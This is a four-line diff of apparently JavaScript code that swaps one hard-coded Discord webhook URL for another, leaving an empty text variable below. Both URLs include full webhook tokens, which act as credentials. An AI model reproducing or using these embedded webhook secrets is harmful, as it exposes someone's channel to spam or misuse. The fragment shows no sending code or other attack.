@@ -1,4 +1,4 @@
-var discord_webhook = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
+var discord_webhook = "https://discord.com/api/webhooks/806072777970417674/-2idlXPKskXKg88MhUTXaixtQTnr_-hng6NsLP7phZqCFAHX04kIZICZ9ZAxli0Zz2l2"
 // defines Discord webhook used
 
 var text = "";
